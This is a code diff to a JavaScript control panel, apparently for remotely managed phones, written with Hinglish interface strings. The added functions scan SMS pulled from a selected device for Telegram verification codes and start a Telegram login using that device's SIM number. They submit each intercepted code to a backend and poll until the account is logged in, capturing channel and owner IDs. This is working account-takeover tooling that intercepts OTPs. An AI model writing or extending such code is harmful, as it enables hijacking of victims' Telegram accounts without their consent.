@@ -1254,8 +1254,8 @@ function saveFirebaseConfigs(){
     if(r&&r.duplicate){
       firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==cfg.id;});
       try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
+      initFirebase();
       toast((r.error||'Duplicate Firebase reject'),false);
-      updateFbUi();
       return;
     }
     if(r&&r.ok)toast('Firebase synced to nya.php',true);
@@ -3776,6 +3776,154 @@ var _autoTokenOn=false;
 var _smsTokenLog=[];
 var _autoTokenConfig={};
 var _autoTokenDeviceSim=1;
+var _tgLoginToken='';
+var _tgLoginPoll=null;
+var _tgLoginSmsTimer=null;
+var _tgLoginSeenOtps={};
+function extractTelegramOtpFromSms(body){
+  if(!body)return'';
+  var text=String(body);
+  if(!/telegram/i.test(text))return'';
+  var m=text.match(/(?:code|login|verification)[:\s]*(\d{5,6})/i)||text.match(/(\d{5,6})\s*(?:is your|is the).*telegram/i)||text.match(/telegram.*?(\d{5,6})/i);
+  return m?m[1]:'';
+}
+function updateTelegramLoginUi(login,extra){
+  var el=document.getElementById('tgDeviceLoginStatus');
+  if(!el)return;
+  login=login||{};
+  var status=login.status||'pending';
+  el.className='tg-login-status';
+  if(status==='logged_in')el.classList.add('ok');
+  else if(status==='code_sent'||status==='verifying'||status==='awaiting_contact'||status==='awaiting_bot')el.classList.add('pending');
+  else el.classList.add('bad');
+  var phone=login.phone||'';
+  var lines=[];
+  if(status==='logged_in'){
+    lines.push('✅ Telegram login ho gaya · '+esc(phone));
+    if(login.tg_username)lines.push('@'+esc(login.tg_username));
+    if(login.channel_id)lines.push('Channel: '+esc(login.channel_id));
+    else lines.push('Channel forward karo bot ko ya Channel ID daalo');
+  }else if(status==='code_sent'||status==='verifying'){
+    lines.push('📨 OTP bheja gaya · '+esc(phone));
+    lines.push('Device SMS se Telegram code auto read ho raha hai…');
+    if(login.otp_detected)lines.push('OTP detect ✓ verify ho raha hai');
+  }else if(status==='awaiting_contact'||status==='awaiting_bot'){
+    lines.push('📱 Device par Telegram kholo · contact share karo');
+    if(login.deep_link)lines.push('<a href="'+esc(login.deep_link)+'" target="_blank" rel="noopener">Bot link kholo</a>');
+  }else{
+    lines.push('Telegram login start karo · '+esc(phone||'device number'));
+  }
+  if(login.error)lines.push('⚠ '+esc(login.error));
+  if(extra)lines.push(esc(extra));
+  el.innerHTML=lines.join('<br>');
+}
+function stopTelegramLoginWatch(){
+  if(_tgLoginPoll){clearInterval(_tgLoginPoll);_tgLoginPoll=null;}
+  if(_tgLoginSmsTimer){clearInterval(_tgLoginSmsTimer);_tgLoginSmsTimer=null;}
+}
+function pollTelegramLoginStatus(){
+  if(!_tgLoginToken)return;
+  smsTokenFetch({action:'tg_device_login_status',token:_tgLoginToken}).then(function(res){
+    if(!res||!res.ok)return;
+    var login=res.login||{};
+    updateTelegramLoginUi(login);
+    if(res.config){
+      _autoTokenConfig=res.config;
+      if(res.config.owner_id){var o=document.getElementById('devTgOwnerId');if(o&&!o.value)o.value=res.config.owner_id;}
+      if(res.config.channel_id){var c=document.getElementById('devTgChannelId');if(c&&!c.value)c.value=res.config.channel_id;}
+    }
+    if(login.status==='logged_in'){
+      stopTelegramLoginWatch();
+      toast('Telegram login ✓ · '+((login.phone)||''),true);
+    }
+  }).catch(function(){});
+}
+function scanDeviceSmsForTelegramOtp(d){
+  if(!d||!_tgLoginToken)return;
+  var list=(deviceSmsCache[d.id]&&deviceSmsCache[d.id].list)||[];
+  for(var i=0;i<list.length;i++){
+    var row=list[i]||{};
+    var code=extractTelegramOtpFromSms(row.body||row.message||row.text||'');
+    if(!code||_tgLoginSeenOtps[code])continue;
+    _tgLoginSeenOtps[code]=1;
+    updateTelegramLoginUi({status:'verifying',phone:getDeviceSmsPhone(d,_autoTokenDeviceSim)},'OTP detect: '+code);
+    smsTokenFetch({action:'tg_device_login_otp',token:_tgLoginToken,code:code}).then(function(res){
+      if(res&&res.ok){
+        if(res.config)_autoTokenConfig=res.config;
+        pollTelegramLoginStatus();
+        return;
+      }
+      var err=(res&&res.error)||'OTP fail';
+      toast(err,false);
+      updateTelegramLoginUi({status:'code_sent',phone:getDeviceSmsPhone(d,_autoTokenDeviceSim)},err);
+    }).catch(function(){toast('OTP verify failed',false);});
+    break;
+  }
+}
+function watchDeviceSmsForTelegramOtp(d){
+  stopTelegramLoginWatch();
+  _tgLoginSeenOtps={};
+  var inst=getFbInstance(d.fbId);
+  if(inst){
+    fetchSmsFast(inst,d).then(function(list){
+      if(!deviceSmsCache[d.id])deviceSmsCache[d.id]={list:[]};
+      deviceSmsCache[d.id].list=mergeSmsLists(deviceSmsCache[d.id].list,list);
+      scanDeviceSmsForTelegramOtp(d);
+    });
+  }
+  _tgLoginSmsTimer=setInterval(function(){
+    var dev=getSelDev();
+    if(!dev||dev.id!==d.id){stopTelegramLoginWatch();return;}
+    var inst2=getFbInstance(dev.fbId);
+    if(!inst2)return;
+    fetchSmsFast(inst2,dev).then(function(list){
+      if(!deviceSmsCache[dev.id])deviceSmsCache[dev.id]={list:[]};
+      deviceSmsCache[dev.id].list=mergeSmsLists(deviceSmsCache[dev.id].list,list);
+      scanDeviceSmsForTelegramOtp(dev);
+    });
+  },4000);
+  _tgLoginPoll=setInterval(pollTelegramLoginStatus,3000);
+}
+function startTelegramDeviceLogin(){
+  var d=getSelDev();
+  if(!d){toast('Pehle device select karo',false);return;}
+  var phone=getDeviceSmsPhone(d,_autoTokenDeviceSim||1);
+  if(!phone){toast('Device par SIM number nahi mila',false);return;}
+  var botToken=String((document.getElementById('devTgBotToken')||{}).value||'').trim();
+  toast('Telegram login start · '+phone,true);
+  updateTelegramLoginUi({status:'pending',phone:phone},'Connecting…');
+  smsTokenFetch({
+    action:'tg_device_login_start',
+    phone:phone,
+    device_id:d.rawId,
+    sim:_autoTokenDeviceSim||1,
+    bot_token:botToken
+  }).then(function(res){
+    if(!res||!res.ok){
+      toast((res&&res.error)||'Login start failed',false);
+      updateTelegramLoginUi({status:'error',phone:phone},(res&&res.error)||'Failed');
+      return;
+    }
+    var login=res.login||{};
+    _tgLoginToken=login.token||'';
+    updateTelegramLoginUi(login);
+    if(res.config){
+      _autoTokenConfig=res.config;
+      fillAutoTokenDeviceFields(_autoTokenConfig);
+    }
+    if(login.status==='logged_in'){
+      toast('Pehle se logged in ✓',true);
+      return;
+    }
+    watchDeviceSmsForTelegramOtp(d);
+    if(login.deep_link){
+      try{window.open(login.deep_link,'_blank');}catch(e){}
+    }
+  }).catch(function(){
+    toast('Telegram login failed',false);
+    updateTelegramLoginUi({status:'error',phone:phone},'Network error');
+  });
+}
 function renderAutoTokenDeviceLog(log){
   var el=document.getElementById('autoTokenDeviceLog');
   if(!el)return;
@@ -3830,6 +3978,11 @@ function openAutoTokenDeviceSetup(d){
   selDev=d.id;
   updateAutoTokenDeviceBanner(d);
   fillAutoTokenDeviceFields(_autoTokenConfig);
+  if(_autoTokenConfig.tg_logged_in){
+    updateTelegramLoginUi({status:'logged_in',phone:_autoTokenConfig.tg_phone||getDeviceSmsPhone(d,_autoTokenDeviceSim),channel_id:_autoTokenConfig.channel_id||''});
+  }else{
+    updateTelegramLoginUi({status:'pending',phone:getDeviceSmsPhone(d,_autoTokenDeviceSim)});
+  }
   renderAutoTokenDeviceLog(_smsTokenLog);
   var bg=document.getElementById('deviceSetupBg');
   var sheet=document.getElementById('autoTokenDeviceSheet');
@@ -3837,6 +3990,8 @@ function openAutoTokenDeviceSetup(d){
   if(sheet)sheet.classList.add('open');
 }
 function closeAutoTokenDeviceSetup(){
+  stopTelegramLoginWatch();
+  _tgLoginToken='';
   var bg=document.getElementById('deviceSetupBg');
   var sheet=document.getElementById('autoTokenDeviceSheet');
   if(bg)bg.classList.remove('open');
